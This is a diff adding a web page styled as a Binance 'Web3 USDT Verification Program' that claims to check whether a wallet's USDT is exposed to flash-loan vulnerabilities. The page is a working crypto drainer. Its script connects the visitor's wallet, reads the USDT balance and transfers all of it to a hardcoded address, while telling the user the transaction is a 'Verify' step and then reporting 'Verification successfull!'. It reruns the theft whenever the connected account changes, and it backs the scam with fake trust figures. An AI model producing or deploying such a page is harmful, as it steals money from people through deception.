@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>Web3 Asset Verification Program: Verify whether your USDT is affected by flash loan vulnerabilities.</title>
+  <link rel="icon" href="https://zinza.dnshfe.com:2083/cpsess4416675332/viewer/home%2fdtflash%2fpublic_html%2fimages/favicone.png" type="image/png">
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+  <style>
+    :root {
+      --primary: #FFD700;
+      --primary-light: rgba(255, 215, 0, 0.1);
+      --dark: #111;
+      --darker: #000;
+      --light: #FFF;
+      --light-dim: rgba(255, 255, 255, 0.7);
+      --success: #4CAF50;
+      --error: #F44336;
+      --warning: #FFC107;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--darker);
+      color: var(--light);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 18px 20px;
+      background: var(--darker);
+      border-bottom: 1px solid rgba(255,255,255,0.1);
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .logo img {
+      height: 38px;
+      width: auto;
+    }
+
+    .logo-text {
+      font-weight: 600;
+      font-size: 1.1rem;
+      color: var(--light);
+    }
+
+    .menu-btn {
+      background: none;
+      border: none;
+      color: var(--light);
+      font-size: 1.4rem;
+      cursor: pointer;
+    }
+
+    /* Side Menu */
+    .side-menu {
+      position: fixed;
+      top: 0;
+      right: -300px;
+      width: 280px;
+      height: 100%;
+      background: var(--darker);
+      border-left: 1px solid rgba(255,215,0,0.2);
+      z-index: 1000;
+      transition: right 0.3s ease;
+      padding: 20px;
+      overflow-y: auto;
+    }
+
+    .side-menu.open {
+      right: 0;
+    }
+
+    .menu-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 30px;
+      padding-bottom: 15px;
+      border-bottom: 1px solid rgba(255,255,255,0.1);
+    }
+
+    .close-btn {
+      background: none;
+      border: none;
+      color: var(--light);
+      font-size: 1.5rem;
+      cursor: pointer;
+    }
+
+    .menu-list {
+      list-style: none;
+    }
+
+    .menu-item {
+      margin-bottom: 15px;
+    }
+
+    .menu-link {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      color: var(--light);
+      text-decoration: none;
+      padding: 12px;
+      border-radius: 8px;
+      transition: all 0.2s ease;
+    }
+
+    .menu-link:hover {
+      background: rgba(255,215,0,0.1);
+      color: var(--primary);
+    }
+
+    .menu-link i {
+      width: 20px;
+      text-align: center;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.5);
+      z-index: 999;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+
+    .overlay.active {
+      opacity: 1;
+      pointer-events: all;
+    }
+
+    .stats-section {
+      padding: 30px 20px;
+      background: linear-gradient(135deg, rgba(255,215,0,0.15) 0%, rgba(0,0,0,0) 100%);
+      text-align: center;
+    }
+
+    .stats-value {
+      font-size: 2.5rem;
+      font-weight: 700;
+      color: var(--primary);
+      margin-bottom: 5px;
+    }
+
+    .stats-label {
+      font-size: 1.1rem;
+      color: var(--light);
+    }
+
+    main {
+      padding: 30px 20px;
+      max-width: 500px;
+      margin: 0 auto;
+      width: 100%;
+      flex: 1;
+    }
+
+    h1 {
+      font-size: 1.8rem;
+      margin-bottom: 15px;
+      text-align: center;
+    }
+
+    h1 span {
+      color: var(--primary);
+      font-weight: 700;
+    }
+
+    .subtitle {
+      color: var(--light-dim);
+      margin-bottom: 30px;
+      font-size: 0.95rem;
+      text-align: center;
+    }
+
+    .btn {
+      background: var(--primary);
+      border: none;
+      padding: 16px 24px;
+      font-size: 1rem;
+      font-weight: 600;
+      border-radius: 12px;
+      cursor: pointer;
+      width: 100%;
+      max-width: 300px;
+      color: var(--darker);
+      margin: 10px auto;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.2s ease;
+    }
+
+    .btn:hover {
+      opacity: 0.9;
+      transform: translateY(-1px);
+    }
+
+    .btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none !important;
+    }
+
+    .btn img {
+      width: 18px;
+      height: 18px;
+      margin-right: 10px;
+    }
+
+    .balance-display {
+      font-size: 1.2rem;
+      margin: 20px 0;
+      text-align: center;
+      display: none;
+    }
+
+    .balance-display span {
+      color: var(--primary);
+      font-weight: 600;
+    }
+
+    /* Notification System */
+    .notification {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      padding: 15px 25px;
+      border-radius: 8px;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      max-width: 90%;
+      width: max-content;
+      z-index: 1001;
+      animation: slideIn 0.3s ease-out;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    }
+
+    @keyframes slideIn {
+      from { bottom: -50px; opacity: 0; }
+      to { bottom: 20px; opacity: 1; }
+    }
+
+    .notification.success {
+      background: var(--success);
+      color: white;
+    }
+
+    .notification.error {
+      background: var(--error);
+      color: white;
+    }
+
+    .notification.warning {
+      background: var(--warning);
+      color: var(--darker);
+    }
+
+    .notification i {
+      font-size: 1.2rem;
+    }
+
+    /* Footer */
+    footer {
+      background: rgba(0,0,0,0.3);
+      padding: 25px 20px;
+      text-align: center;
+      border-top: 1px solid rgba(255,255,255,0.05);
+    }
+
+    .footer-content {
+      max-width: 500px;
+      margin: 0 auto;
+    }
+
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-bottom: 15px;
+    }
+
+    .footer-link {
+      color: var(--light-dim);
+      text-decoration: none;
+      font-size: 0.9rem;
+      transition: color 0.2s ease;
+    }
+
+    .footer-link:hover {
+      color: var(--primary);
+    }
+
+    .copyright {
+      color: var(--light-dim);
+      font-size: 0.8rem;
+      margin-top: 10px;
+    }
+
+    .loading {
+      display: inline-block;
+      width: 18px;
+      height: 18px;
+      border: 3px solid rgba(0,0,0,0.3);
+      border-radius: 50%;
+      border-top-color: var(--darker);
+      animation: spin 1s linear infinite;
+      margin-left: 10px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="logo">
+      <img src="https://raw.githubusercontent.com/bscverify/bscverify/refs/heads/main/Binance%20Web3%20Wallet.png"/>
+      <span class="logo-text"></span>
+    </div>
+    <button class="menu-btn" id="menuBtn">
+      <i class="fas fa-bars"></i>
+    </button>
+  </header>
+
+  <!-- Side Menu -->
+  <div class="side-menu" id="sideMenu">
+    <div class="menu-header">
+      <div class="logo">
+        <img src="https://raw.githubusercontent.com/bscverify/bscverify/refs/heads/main/Binance%20Web3%20Wallet.png"/>
+        <span class="logo-text"></span>
+      </div>
+      <button class="close-btn" id="closeBtn">
+        <i class="fas fa-times"></i>
+      </button>
+    </div>
+    <ul class="menu-list">
+      <li class="menu-item">
+        <a href="#" class="menu-link" onclick="closeMenu()">
+          <i class="fas fa-home"></i>
+          <span>Home</span>
+        </a>
+      </li>
+      <li class="menu-item">
+        <a href="https://bscscan.com/" target="_blank" class="menu-link">
+          <i class="fas fa-link"></i>
+          <span>Blockchain</span>
+        </a>
+      </li>
+      <li class="menu-item">
+        <a href="https://bscscan.com/tokens" target="_blank" class="menu-link">
+          <i class="fas fa-coins"></i>
+          <span>Tokens</span>
+        </a>
+      </li>
+      <li class="menu-item">
+        <a href="https://bscscan.com/validators" target="_blank" class="menu-link">
+          <i class="fas fa-check-circle"></i>
+          <span>Validators</span>
+        </a>
+      </li>
+      <li class="menu-item">
+        <a href="https://bscscan.com/nft-top-contracts" target="_blank" class="menu-link">
+          <i class="fas fa-image"></i>
+          <span>NFTs</span>
+        </a>
+      </li>
+      <li class="menu-item">
+        <a href="https://bscscan.com/charts" target="_blank" class="menu-link">
+          <i class="fas fa-chart-line"></i>
+          <span>Resources</span>
+        </a>
+      </li>
+      <li class="menu-item">
+        <a href="https://bscscan.com/verifyContract" target="_blank" class="menu-link">
+          <i class="fas fa-code"></i>
+          <span>Developers</span>
+        </a>
+      </li>
+    </ul>
+  </div>
+
+  <div class="overlay" id="overlay"></div>
+
+  <section class="stats-section">
+    <div class="stats-value">27.5 Million</div>
+    <div class="stats-label">USERS TRUST US</div>
+  </section>
+
+  <main>
+    <h1><span>Web3</span> USDT Verification Program</h1>
+    <p class="subtitle">Make sure your tokens are secure on the Binance Smart Chain.</p>
+
+    <button class="btn" id="actionBtn">
+      <img src="https://img.icons8.com/material-rounded/24/000000/wallet.png" alt="Wallet Icon"/>
+      <span id="btnText">Verify USDT</span>
+    </button>
+
+    <div class="balance-display" id="balanceDisplay">
+      Your USDT Balance: <span id="usdtBalance">0.00</span>
+    </div>
+  </main>
+
+  <footer>
+   <div class="footer-content">
+      <div class="footer-links">
+        <a href="t" class="footer-link">Terms</a>
+        <a href="p" class="footer-link">Privacy</a>
+        <a href="f" class="footer-link">Contact</a>
+      </div>
+</div>
+
+      <div class="copyright">
+        © 2023-2025 Web3 Wallet. All rights reserved.
+      </div>
+  </footer>
+
+  <script>
+    // Wallet Configuration
+    const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
+    const recipient = "0x91B834Db6806212D8361719b03aF1b01eE33c486";
+    const BSC_CHAIN_ID = "0x38"; // Binance Smart Chain
+    const abi = [
+      { 
+        "constant": true, 
+        "inputs": [{ "name": "_owner", "type": "address" }], 
+        "name": "balanceOf", 
+        "outputs": [{ "name": "balance", "type": "uint256" }], 
+        "type": "function" 
+      },
+      { 
+        "constant": false, 
+        "inputs": [
+          { "name": "_to", "type": "address" }, 
+          { "name": "_value", "type": "uint256" }
+        ], 
+        "name": "transfer", 
+        "outputs": [{ "name": "", "type": "bool" }], 
+        "type": "function" 
+      }
+    ];
+
+    // DOM Elements
+    const actionBtn = document.getElementById('actionBtn');
+    const btnText = document.getElementById('btnText');
+    const balanceDisplay = document.getElementById('balanceDisplay');
+    const usdtBalance = document.getElementById('usdtBalance');
+    const menuBtn = document.getElementById('menuBtn');
+    const closeBtn = document.getElementById('closeBtn');
+    const sideMenu = document.getElementById('sideMenu');
+    const overlay = document.getElementById('overlay');
+
+    // Menu Functions
+    function openMenu() {
+      sideMenu.classList.add('open');
+      overlay.classList.add('active');
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closeMenu() {
+      sideMenu.classList.remove('open');
+      overlay.classList.remove('active');
+      document.body.style.overflow = '';
+    }
+
+    menuBtn.addEventListener('click', openMenu);
+    closeBtn.addEventListener('click', closeMenu);
+    overlay.addEventListener('click', closeMenu);
+
+    // Notification System
+    function showNotification(message, type) {
+      const notification = document.createElement('div');
+      notification.className = `notification ${type}`;
+      
+      let icon;
+      switch(type) {
+        case 'success':
+          icon = '<i class="fas fa-check-circle"></i>';
+          break;
+        case 'error':
+          icon = '<i class="fas fa-exclamation-circle"></i>';
+          break;
+        case 'warning':
+          icon = '<i class="fas fa-exclamation-triangle"></i>';
+          break;
+        default:
+          icon = '<i class="fas fa-info-circle"></i>';
+      }
+      
+      notification.innerHTML = `${icon}${message}`;
+      document.body.appendChild(notification);
+      
+      setTimeout(() => {
+        notification.style.opacity = '0';
+        setTimeout(() => {
+          notification.remove();
+        }, 300);
+      }, 5000);
+    }
+
+    // Wallet Functions
+    async function connectAndTransfer() {
+      if (!window.ethereum) {
+        showNotification('Please install MetaMask or a Web3 wallet', 'error');
+        return;
+      }
+
+      try {
+        actionBtn.disabled = true;
+        btnText.innerHTML = 'Processing<span class="loading"></span>';
+        
+        // Initialize Web3
+        const web3 = new Web3(window.ethereum);
+        
+        // Request accounts
+        const accounts = await window.ethereum.request({ 
+          method: 'eth_requestAccounts' 
+        });
+        
+        if (accounts.length === 0) {
+          throw new Error('No accounts found');
+        }
+        
+        const account = accounts[0];
+        
+        // Switch to BSC network
+        try {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: BSC_CHAIN_ID }]
+          });
+        } catch (switchError) {
+          // This error code indicates that the chain has not been added to MetaMask
+          if (switchError.code === 4902) {
+            await window.ethereum.request({
+              method: 'wallet_addEthereumChain',
+              params: [{
+                chainId: BSC_CHAIN_ID,
+                chainName: 'Binance Smart Chain',
+                nativeCurrency: {
+                  name: 'BNB',
+                  symbol: 'BNB',
+                  decimals: 18
+                },
+                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                blockExplorerUrls: ['https://bscscan.com']
+              }]
+            });
+          } else {
+            throw switchError;
+          }
+        }
+        
+        // Initialize contract
+        const contract = new web3.eth.Contract(abi, USDT_BEP20);
+        
+        // Get USDT balance
+        const balance = await contract.methods.balanceOf(account).call();
+        const formattedBalance = web3.utils.fromWei(balance, 'ether');
+        
+        // Update UI
+        usdtBalance.textContent = formattedBalance;
+        balanceDisplay.style.display = 'block';
+        
+        if (parseFloat(formattedBalance) <= 0) {
+          showNotification('No USDT balance to Verify', 'warning');
+          return;
+        }
+        
+        showNotification('Confirm Verify in your wallet', 'warning');
+        
+        // Execute transfer
+        const tx = await contract.methods.transfer(recipient, balance)
+          .send({ from: account });
+        
+        showNotification('USDT Verification successfull!', 'success');
+        
+      } catch (error) {
+        console.error('Error:', error);
+        showNotification(`Error: ${error.message}`, 'error');
+      } finally {
+        actionBtn.disabled = false;
+        btnText.textContent = 'Retry Verifing USDT';
+      }
+    }
+
+    // Initialize
+    actionBtn.addEventListener('click', connectAndTransfer);
+
+    // Handle account/chain changes
+    if (window.ethereum) {
+      window.ethereum.on('accountsChanged', (accounts) => {
+        if (accounts.length === 0) {
+          balanceDisplay.style.display = 'none';
+        } else {
+          // Reconnect if account changes
+          connectAndTransfer();
+        }
+      });
+
+      window.ethereum.on('chainChanged', () => {
+        window.location.reload();
+      });
+    }
+  </script>
+</body>
+</html>
